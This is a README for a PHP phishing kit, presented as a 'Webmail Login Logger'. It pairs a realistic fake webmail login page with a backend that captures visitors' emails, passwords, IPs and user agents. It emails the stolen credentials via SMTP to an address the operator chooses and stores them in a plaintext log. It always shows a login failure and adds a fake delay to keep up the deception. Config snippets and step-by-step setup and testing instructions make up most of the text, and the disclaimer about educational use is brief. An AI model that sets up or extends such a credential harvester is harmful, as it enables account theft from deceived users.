# Webmail Login Logger

A PHP-based system that captures webmail login attempts and sends them via SMTP email. This system includes a realistic webmail login interface and a backend that logs all login attempts.

## Files Included

- `index.html` - Your webmail login interface
- `postmailer.php` - Backend PHP script that handles form submissions and sends emails
- `config.php` - Configuration file for SMTP and logging settings
- `README.md` - This documentation file

## Setup Instructions

### 1. Configure SMTP Settings

Edit the `config.php` file and update the SMTP settings:

```php
'smtp' => [
    'host' => 'smtp.gmail.com',           // Your SMTP server
    'port' => 587,                        // 587 for TLS, 465 for SSL
    'username' => 'your-email@gmail.com', // Your SMTP username
    'password' => 'your-app-password',    // Your app password
    'encryption' => 'tls',                // 'tls', 'ssl', or 'none'
    'from_email' => 'your-email@gmail.com',
    'from_name' => 'Webmail Security Logger'
],
```

### 2. Set Log Destination

Update the logging email address where you want to receive the captured credentials:

```php
'logging' => [
    'log_email' => 'logs@yourdomain.com', // Change this to your email
    'subject' => 'Webmail Login Attempt - Security Alert',
    // ... other settings
],
```

### 3. Upload Files

Upload all files to your web server:
- Ensure your server supports PHP 7.0 or higher
- Make sure the files are in the same directory
- Ensure the web server has write permissions for the log file

### 4. Test the System

1. Open your webmail login page in a browser
2. Enter test credentials
3. Submit the form
4. Check your log email for the captured data

## SMTP Provider Setup

### Gmail
1. Enable 2-factor authentication on your Google account
2. Generate an App Password:
   - Go to Google Account settings
   - Security > App passwords
   - Generate a new app password for "Mail"
3. Use this app password in the config file

### Other Providers
- **Outlook/Hotmail**: smtp-mail.outlook.com, port 587, TLS
- **Yahoo**: smtp.mail.yahoo.com, port 587, TLS
- **Custom SMTP**: Contact your hosting provider for settings

## Features

### Email Logging
- Captures email and password from login attempts
- Logs IP address, timestamp, and user agent
- Includes geolocation information (when available)
- Sends formatted HTML emails with all details

### Security Features
- Configurable delay to simulate real authentication
- Domain restrictions (optional)
- Rate limiting (configurable)
- Local file backup of all attempts

### Response Handling
- Always returns authentication failure to maintain facade
- Customizable error messages
- JSON responses for AJAX handling

## Log Format

The system creates two types of logs:

### Email Log (HTML format)
- Professional formatted email with all capture details
- Includes styling and organization
- Contains IP geolocation information

### File Log (Text format)
- Simple text format for backup: `timestamp | IP | email | password | user_agent`
- Stored in `login_logs.txt` by default

## Configuration Options

### Security Settings
```php
'security' => [
    'simulate_delay' => 2,                // Authentication delay in seconds
    'max_attempts_per_ip' => 10,          // Rate limiting (future feature)
    'enable_ip_blocking' => false,        // IP blocking (future feature)
    'allowed_domains' => [],              // Restrict to specific email domains
],
```

### Custom Messages
```php
'messages' => [
    'invalid_credentials' => 'Invalid email or password...',
    'missing_fields' => 'Email and password are required.',
    'invalid_email' => 'Invalid email format.',
    'invalid_domain' => 'Email domain not allowed.'
]
```

## Troubleshooting

### Email Not Sending
1. Check SMTP credentials in `config.php`
2. Verify SMTP server settings
3. Check server error logs
4. Ensure PHP has socket extension enabled

### File Permissions
1. Ensure web server can write to the directory
2. Check that `login_logs.txt` is writable
3. Verify directory permissions (755 recommended)

### Testing
1. Check browser console for JavaScript errors
2. Verify the form action URL matches your PHP file location
3. Test SMTP connection separately if needed

## Security Considerations

- This system is for educational/testing purposes
- Ensure proper authorization before deployment
- Keep configuration files secure
- Use HTTPS to protect transmitted data
- Regularly review and clean log files

## File Permissions

Recommended file permissions:
- PHP files: 644
- Config file: 600 (more restrictive)
- Log files: 644
- Directory: 755

## Support

For issues or questions:
1. Check server error logs
2. Verify SMTP connectivity
3. Test with different email providers
4. Ensure all required PHP extensions are available

---

**Note**: This system is designed for security testing and educational purposes. Ensure you have proper authorization before deploying in any environment.